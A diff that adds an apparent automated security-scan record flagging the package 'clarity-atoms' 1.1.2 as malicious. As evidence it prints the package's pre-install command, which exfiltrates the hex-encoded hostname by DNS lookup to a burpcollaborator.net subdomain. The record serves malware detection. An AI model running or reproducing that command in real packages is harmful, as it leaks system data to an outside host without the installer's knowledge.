@@ -1,0 +1,34 @@
+{
+  "package_name": "clarity-atoms",
+  "version": "1.1.2",
+  "label": "malicious",
+  "behaviors": [
+    {
+      "category": "data_exfiltration",
+      "summary": "The package contains a pre-install hook that exfiltrates data.",
+      "details": "The pre-install hook contains commands that perform data exfiltration. The commands include 'echotest' and 'dig' followed by a command to read the hostname.",
+      "confidence": 0.97,
+      "evidence_commands": [
+        "echotest",
+        "dig `xxd-p/etc/hostname`.k4patrwflxsxghdt6a9g2yoei5owcl.burpcollaborator.net"
+      ],
+      "evidence_files": [],
+      "evidence_apis": [],
+      "evidence_domains": [],
+      "evidence_env_vars": []
+    }
+  ],
+  "risk_vector": [
+    "data_exfiltration"
+  ],
+  "analyst_note": "",
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "semantic_v2.0",
+    "routing": "flag",
+    "structural_risk_score": 0.9693,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-26T22:08:56.651886"
+}
